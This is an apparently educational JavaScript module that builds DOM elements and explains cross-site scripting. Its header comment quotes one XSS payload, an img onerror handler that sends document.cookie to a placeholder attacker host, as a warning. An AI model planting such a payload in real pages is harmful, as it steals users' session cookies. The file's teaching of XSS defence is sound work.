/**
 * A 30-line helper for building DOM elements.
 *
 * This is the file that shows you what a framework's templating actually does.
 * There is no magic in `el('p', {}, 'hello')` — it calls
 * `document.createElement` and `append`, which is all React's JSX compiles down
 * to as well.
 *
 * THE SECURITY LESSON, and it is the most important one on the front end:
 *
 *     element.innerHTML = `<h3>${event.title}</h3>`;   // ← DANGEROUS
 *
 * If any part of that string came from a user or a database, a title of
 * `<img src=x onerror="fetch('https://evil.example?c='+document.cookie)">`
 * becomes REAL MARKUP and the script runs. That is cross-site scripting (XSS).
 *
 * This helper never parses strings as HTML. Text goes through `textContent`,
 * which the browser always treats as text, never as markup. React escapes
 * interpolated values for the same reason — you are just doing it explicitly.
 *
 * Rule to carry with you: use `textContent` for text, `createElement` for
 * structure, and reach for `innerHTML` only for markup you wrote yourself.
 */

/**
 * Creates an element.
 *
 * @param tag       e.g. 'button'
 * @param props     attributes and properties. Special keys:
 *                    class    → className
 *                    dataset  → data-* attributes
 *                    on       → { click: handler } event listeners
 *                    aria-*   → set as attributes
 * @param children  a string, a Node, or a (nested) array of them. Null and
 *                  false are skipped, so `cond && el(...)` works inline.
 */
export function el(tag, props = {}, children = []) {
  const node = document.createElement(tag);

  for (const [key, value] of Object.entries(props)) {
    if (value === null || value === undefined || value === false) continue;

    if (key === 'class') {
      node.className = value;
    } else if (key === 'dataset') {
      Object.assign(node.dataset, value);
    } else if (key === 'on') {
      for (const [event, handler] of Object.entries(value)) node.addEventListener(event, handler);
    } else if (key === 'style' && typeof value === 'object') {
      Object.assign(node.style, value);
    } else if (key.startsWith('aria-') || key === 'role' || key === 'tabindex') {
      // These must be ATTRIBUTES. Setting node.ariaChecked works in modern
      // browsers, but attributes are what assistive technology has always read.
      node.setAttribute(key, String(value));
    } else {
      // Everything else is set as a property: node.href, node.disabled,
      // node.textContent. Properties are typed; attributes are all strings.
      node[key] = value;
    }
  }

  append(node, children);
  return node;
}

/** Appends children, flattening arrays and skipping null/false/undefined. */
export function append(parent, children) {
  for (const child of [children].flat(Infinity)) {
    if (child === null || child === undefined || child === false) continue;
    // A string becomes a TEXT node — never parsed as markup. This one line is
    // the XSS defence described above.
    parent.append(child instanceof Node ? child : document.createTextNode(String(child)));
  }
  return parent;
}

/** Empties an element. `replaceChildren()` with no arguments is the modern way. */
export function clear(node) {
  node.replaceChildren();
  return node;
}

/** Replaces an element's contents in one operation. */
export function render(node, children) {
  clear(node);
  append(node, children);
  return node;
}
